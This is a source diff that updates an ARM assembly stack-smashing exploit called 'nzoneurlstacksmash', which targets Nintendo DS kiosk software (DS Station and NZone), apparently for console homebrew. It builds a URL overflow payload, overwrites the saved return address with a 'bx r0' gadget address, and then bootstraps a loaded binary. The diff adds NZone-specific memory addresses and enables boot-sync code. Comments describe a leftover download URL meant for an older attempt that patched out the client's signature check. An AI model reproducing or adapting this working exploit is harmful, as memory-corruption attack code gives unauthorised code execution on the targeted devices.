@@ -21,7 +21,7 @@ DEALINGS IN THE SOFTWARE.
 
 /* EEPROM writing code is based on EEPROM code from WinterMute's cookhack. The eeprom_write procedure is compatible with only EEPROM type 2. */
 
-/* nzoneurlstacksmash v0.1 */
+/* nzoneurlstacksmash v0.2 */
 
 .arch armv5te
 .fpu softvfp
@@ -37,20 +37,25 @@ DEALINGS IN THE SOFTWARE.
 #define	REG_BASE	0x04000000
 
 .incbin	"overflow.html"
+#if defined(DS_STATION)
 .incbin "urloverflow"
+#endif
+#if defined(NZONE)
+.incbin "urloverflownzone"
+#endif
+
 @ The below are the addresses of the 'bx r0' instruction in the IRQ handler. This is the address that overwrites LR on the stack.
 #if defined(DS_STATION)
 .word 0x01ffb550 @ NTR SDK address
 #endif
 
 #if defined(NZONE)
-.word 0x01ff8104 @ TWL SDK address
+.word 0x01ff9aa8 @ TWL SDK address
 #endif
 
 .ascii "ppp"
 .byte 0x22 @ The '"' character.
 
-/*
 #if defined(DS_STATION)
 #define BOOTSIGNAL 0x027ffdff
 #define NDSHEADER 0x027ffe00
@@ -60,7 +65,6 @@ DEALINGS IN THE SOFTWARE.
 #define BOOTSIGNAL 0x02fffdff
 #define NDSHEADER 0x02fffe00
 #endif
-*/
 
 _start:
 .arm
@@ -153,7 +157,12 @@ bne ipcreplywait
 mov r0, r8
 mov r1, #0
 str r1, [r0] @ REG_IME = 0;
+#if defined(DS_STATION)
 ldr r0, =0x027e3ffc
+#endif
+#if defined(NZONE)
+ldr r0, =0x02fe3ffc
+#endif
 @sub r0, r0, r6
 @cmp r5, #0
 @beq bootstrapArm7_irqclear_dsmode
@@ -177,9 +186,15 @@ lsl r1, r1, #4
 strh r1, [r0]
 
 mov r0, #0
-ldr r1, =0x027ffd80
+#if defined(DS_STATION)
+ldr r1, =0x027ffd80 @ Not sure if this clearing code is really needed, Nintendo clears this memory when bootstrapping.
 @ldr r2, =0x027ffd9c
 ldr r2, =0x027ffe00
+#endif
+#if defined(NZONE)
+ldr r1, =0x02fffd80
+ldr r2, =0x02fffe00
+#endif
 @add r1, r1, r5
 @add r2, r2, r5
 clearlp1:
@@ -188,8 +203,14 @@ add r1, r1, #4
 cmp r1, r2
 blt clearlp1
 
+#if defined(DS_STATION)
 ldr r1, =0x027fff80
 ldr r2, =0x027fff98
+#endif
+#if defined(NZONE)
+ldr r1, =0x02ffff80
+ldr r2, =0x02ffff98
+#endif
 @add r1, r1, r5
 @add r2, r2, r5
 clearlp2:
@@ -199,8 +220,14 @@ cmp r1, r2
 blt clearlp2
 
 strh r0, [r1]
+#if defined(DS_STATION)
 ldr r1, =0x027fff9c
 ldr r2, =0x02800000
+#endif
+#if defined(NZONE)
+ldr r1, =0x02ffff9c
+ldr r2, =0x03000000
+#endif
 @add r1, r1, r5
 @add r2, r2, r5
 clearlp3:
@@ -237,7 +264,7 @@ and r0, r0, r1
 cmp r0, #1
 bne bootstrapArm7DSiSync_end
 
-/*
+#if defined(NZONE)
 push {r5}
 ldr r0, =0x02fffc24
 add r1, r0, #0x2
@@ -265,12 +292,15 @@ cmp r5, r3
 beq twl_bootwait1
 
 pop {r5}
-*/
+#endif
+
+#if defined(DS_STATION)
 nop
 nop
 nop
 nop
 nop
+#endif
 
 bootstrapArm7DSiSync_end:
 bx lr
@@ -330,8 +360,12 @@ bl swiDecompressLZSSVram
 
 @ndsloadstub_dsmode:
 @ldr r5, [sp, #4]
+#if defined(DS_STATION)
 ldr r0, =0x027ffdff
-@ldreq r0, =0x02fffdff
+#endif
+#if defined(NZONE)
+ldr r0, =0x02fffdff
+#endif
 @add r0, r0, r5
 mov r1, #0
 strb r1, [r0]
@@ -358,7 +392,12 @@ ldr r0, =0x04000242
 mov r1, #0x82
 strb r1, [r0]
 
+#if defined(DS_STATION)
 ldr r1, =0x027ffe34
+#endif
+#if defined(NZONE)
+ldr r1, =0x02fffe34
+#endif
 ldr r0, =0x06000000
 str r0, [r1]
 
@@ -411,7 +450,12 @@ bx r0
 @lsl r5, r5, #16
 
 @ndsloadstub_arm7_dsmode:
+#if defined(DS_STATION)
 ldr r4, =0x027ffdff
+#endif
+#if defined(NZONE)
+ldr r4, =0x02fffdff
+#endif
 @add r4, r4, r5
 @mov r1, #1
 @strb r1, [r4]
@@ -519,7 +563,12 @@ beq ndsloadstub_arm7_vcountwait2
 strb r2, [r4]
 
 @pop {r5}
+#if defined(DS_STATION)
 ldr r3, =0x027ffe34
+#endif
+#if defined(NZONE)
+ldr r3, =0x02fffe34
+#endif
 @add r0, r0, r5
 ldr r0, [r3]
 mov lr, r0
@@ -621,7 +670,12 @@ ndsloadstub_headerarm7cpy:
 @bne ndsloadstub_headerarm7cpy_arm7stubwait
 
 ldr r0, =0x02300000
+#if defined(DS_STATION)
 ldr r1, =0x027ffe00
+#endif
+#if defined(NZONE)
+ldr r1, =0x02fffe00
+#endif
 mov r2, #0x16
 lsl r2, r2, #4
 @add r1, r1, r5
@@ -634,7 +688,12 @@ add r1, r1, #4
 sub r2, r2, #4
 bgt ndsloadstub_hdrcpylp
 
+#if defined(DS_STATION)
 ldr r0, =0x027ffdff
+#endif
+#if defined(NZONE)
+ldr r0, =0x02fffdff
+#endif
 mov r1, #1
 strb r1, [r0]
 @add r0, r0, r5
@@ -662,7 +721,12 @@ ldrb r1, [r0]
 cmp r1, #3
 bne ndsloadstub_headerarm7cpy_bootwait
 
+#if defined(DS_STATION)
 ldr r3, =0x027ffe00
+#endif
+#if defined(NZONE)
+ldr r3, =0x02fffe00
+#endif
 @add r3, r3, r5
 ldr r0, [r3, #0x24]
 mov lr, r0
@@ -1034,12 +1098,14 @@ bx lr
 .arm
 
 
-params: @ Dummy authenication params for download function. Not used by the real server, but the client sends it.
+params: @ This string is not used, it's for old haxx to dl a bin from a server. Dummy authenication params for download function. Not used by the real server, but the client sends it.
 .string "dsmac=something&apmac=appy&apnum=yeah&token=tok"
 
 url:
 .string "https://yellzone.en/ds/trial/9R3viUq2/1116984960.srl"
+@ This URL isn't used, it's for old haxx attempting to get the client to dl a bin from a server with the client sig check patched out.
 @ The client doesn't download the above URL directly. It downloads url.header,(replace url with the content of the above url string) and url.signature. Then, it calcuates the number of split files that need downloaded: arm9/7 binary (size / 0x3200) + 1.(200KB for each split file.)
+@ For downloaded binaries, DS Station uses the above system, but NZone may download the SRL directly to RAM without any splitting system?
 
 .align 2
 
